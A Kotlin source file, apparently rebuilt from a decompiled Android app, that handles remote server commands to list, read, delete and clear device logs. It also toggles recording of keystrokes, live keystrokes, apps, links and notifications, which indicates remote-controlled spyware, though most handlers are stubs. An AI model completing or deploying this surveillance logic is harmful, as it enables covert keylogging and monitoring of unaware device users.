package com.storm.safe.rock.service.modules.command

import android.util.Log
import org.json.JSONObject

/**
 * Handles log management commands.
 *
 * Reverse-engineered from JADX: C0348a5 (a5, 329 lines).
 * Vendor name: LogCommandHandler
 *
 * Supported commands:
 * - GET_LOG_LIST, GET_ALL_LOG_LISTS, READ_LOG, DELETE_LOG
 * - CLEAR_LOGS, CLEAR_ALL_LOGS, SET_LOG_OPTIONS, GET_LOG_OPTIONS
 */
class LogCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "LogCommandHandler"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "GET_LOG_LIST",
        "GET_ALL_LOG_LISTS",
        "READ_LOG",
        "DELETE_LOG",
        "CLEAR_LOGS",
        "CLEAR_ALL_LOGS",
        "SET_LOG_OPTIONS",
        "GET_LOG_OPTIONS"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        val requestId = params?.optString("requestId", "") ?: ""

        val result = processCommand(command, params)

        // Send result back to server
        if (requestId.isNotEmpty()) {
            result.put("requestId", requestId)
        }

        val networkManager = context.networkManager
        if (networkManager != null) {
            // vendor: sends via NetworkManager with specific event types
            context.sendEvent("log_command_result", result)
        }
    }

    /**
     * Process a log command and return the result JSON.
     * Vendor: m211879a3 (static)
     */
    internal fun processCommand(command: String, params: JSONObject?): JSONObject {
        val result = JSONObject()

        when (command) {
            "GET_LOG_LIST" -> {
                val type = params?.optString("type", "KSTR") ?: "KSTR"
                // vendor: calls ActivityMonitor.listLogFiles(logType)
                // Wire: val files = ActivityMonitor.listLogFiles(logType) → JSONArray
                result.put("success", true)
                result.put("type", type)
                result.put("files", org.json.JSONArray())  // vendor: wired to ActivityMonitor
                Log.d(TAG, "获取日志列表: type=$type")
            }
            "GET_ALL_LOG_LISTS" -> {
                // vendor: iterates all LogType values
                result.put("success", true)
                result.put("lists", JSONObject())
                Log.d(TAG, "获取所有日志列表")
            }
            "READ_LOG" -> {
                val type = params?.optString("type", "KSTR") ?: "KSTR"
                val filename = params?.optString("filename", "") ?: ""

                if (filename.isEmpty()) {
                    result.put("success", false)
                    result.put("error", "filename is required")
                    return result
                }

                // vendor: reads from /sdcard/IC/<type>/<filename>.txt
                result.put("success", true)
                result.put("type", type)
                result.put("filename", filename)
                result.put("content", "")
                Log.d(TAG, "读取日志: type=$type, filename=$filename")
            }
            "DELETE_LOG" -> {
                val type = params?.optString("type", "KSTR") ?: "KSTR"
                val filename = params?.optString("filename", "") ?: ""

                if (filename.isEmpty()) {
                    result.put("success", false)
                    result.put("error", "filename is required")
                    return result
                }

                // vendor: deletes file from /sdcard/IC/<type>/
                result.put("success", true)
                result.put("type", type)
                result.put("filename", filename)
                Log.d(TAG, "删除日志: type=$type, filename=$filename")
            }
            "CLEAR_LOGS" -> {
                val type = params?.optString("type", "KSTR") ?: "KSTR"
                result.put("success", true)
                result.put("type", type)
                Log.d(TAG, "清空日志: type=$type")
            }
            "CLEAR_ALL_LOGS" -> {
                result.put("success", true)
                Log.d(TAG, "清空所有日志")
            }
            "SET_LOG_OPTIONS" -> {
                // vendor: sets static fields on ActivityMonitor
                if (params != null) {
                    if (params.has("recKeystrokes")) {
                        Log.d(TAG, "Set recKeystrokes=${params.optBoolean("recKeystrokes", true)}")
                    }
                    if (params.has("liveKeystrokes")) {
                        Log.d(TAG, "Set liveKeystrokes=${params.optBoolean("liveKeystrokes", false)}")
                    }
                    if (params.has("recApps")) {
                        Log.d(TAG, "Set recApps=${params.optBoolean("recApps", true)}")
                    }
                    if (params.has("recLinks")) {
                        Log.d(TAG, "Set recLinks=${params.optBoolean("recLinks", true)}")
                    }
                    if (params.has("recNotifications")) {
                        Log.d(TAG, "Set recNotifications=${params.optBoolean("recNotifications", true)}")
                    }
                }
                result.put("success", true)
                result.put("options", getLogOptions())
                Log.d(TAG, "设置日志选项")
            }
            "GET_LOG_OPTIONS" -> {
                result.put("success", true)
                result.put("options", getLogOptions())
                Log.d(TAG, "获取日志选项")
            }
            else -> {
                result.put("success", false)
                result.put("error", "Unknown command: $command")
            }
        }

        return result
    }

    /**
     * Get current log options as JSON.
     * Vendor: m211880a4
     */
    private fun getLogOptions(): JSONObject {
        return JSONObject().apply {
            // vendor: reads from ActivityMonitor static fields
            put("recKeystrokes", true)
            put("liveKeystrokes", false)
            put("recApps", true)
            put("recLinks", true)
            put("recNotifications", true)
        }
    }
}
